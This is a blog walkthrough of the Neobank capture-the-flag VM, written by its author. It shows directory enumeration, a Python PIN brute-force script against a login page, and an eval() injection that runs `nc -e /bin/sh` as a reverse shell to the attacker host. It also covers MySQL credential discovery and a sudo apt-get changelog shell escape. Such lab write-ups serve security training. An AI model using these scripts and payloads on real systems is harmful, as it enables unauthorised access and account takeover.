---
layout: post
title:  "Neobank - Walkthrough"
date:   2020-12-28 10:10:05 +0300
categories: [vulnhub,hackmyvm,walkthrough,myvms]
pin: true
tags: [enumeration,bruteforce,google authenticator,eval,sudo]
image: /images/neobank.jpg
---
- You’ll find this vm in Vulnhub `https://www.vulnhub.com/entry/neobank-1,642/`

- Also to HackMyVm `https://hackmyvm.eu/machines/machine.php?vm=Neobank`

- Difficulty : Medium

##  Youtube Video

<iframe width="700" height="415" src="https://www.youtube.com/embed/kxbu7R75AxQ" frameborder="0" allowfullscreen></iframe>

## Directory Scan

{% highlight sh %}
  ┌──(alienum㉿kali)-[~]
  └─$ gobuster dir -k -u http://10.0.2.121:5000/ -w /usr/share/dirbuster/wordlists/directory-list-lowercase-2.3-medium.txt
  /login
  /logout
  /otp
  /qr
  /withdraw
  /email_list
{% endhighlight %}

## Retreive emails

- Under the `/email_list` you can retrieve the emails

```sh
zeus@neobank.vln
hera@neobank.vln
apollo@neobank.vln
athena@neobank.vln
poseidon@neobank.vln
ares@neobank.vln
artemis@neobank.vln
demeter@neobank.vln
aphrodite@neobank.vln
dionysos@neobank.vln
hermes@neobank.vln
hephaistos@neobank.vln
```

## Brute force

- Creating the `pins` wordlist using `rockyou.txt`

```
cat /usr/share/wordlists/rockyou.txt | grep "^[0-9]" > pins.txt
```

- bruteforce script

{% highlight python %}
import requests
import sys
url = 'http://10.0.2.121:5000/login'
with open('/home/alienum/Desktop/emails.txt') as users:
  for u in users:
    with open('/home/alienum/Desktop/pins.txt') as pins:
       for p in pins:
          user = {"email":u.strip(),"pin":p.strip()}
          r =  requests.post(url,data = user)
          if len(r.cookies) != 0:
             print('~~~~~~~~~~~~~~~~~~~')
             print('Credentials found!!')
             print('~~~~~~~~~~~~~~~~~~~')
             print('[+] Username : '+ u.strip())
             print('[+] Password : '+ p.strip())
             sys.exit()
{% endhighlight %}

- Run it
```
┌──(alienum㉿kali)-[~]
└─$ python3 neobank-bf.py
[+] Username : zeus@neobank.vln
[+] Password : 2*****
```

## OTP google authenticator

- Scan the qrcode and insert the otp code

## Exploit eval() python function

```
__import__('os').system('nc -e /bin/sh 10.0.2.15 4444')
```

#### MySQL enumeration find banker credentials

{% highlight sh %}
  cat /var/www/html/main.py
  banker:neobank1
  mysql -u banker -pneobank1
  use bank;
  select * from system;
  banker:adv1se.me
{% endhighlight %}

## GTFObins

- sudo -l

{% highlight sh %}
  sudo apt-get changelog apt
  !/bin/sh
{% endhighlight %}

- This vm created by me, i enjoyed the process
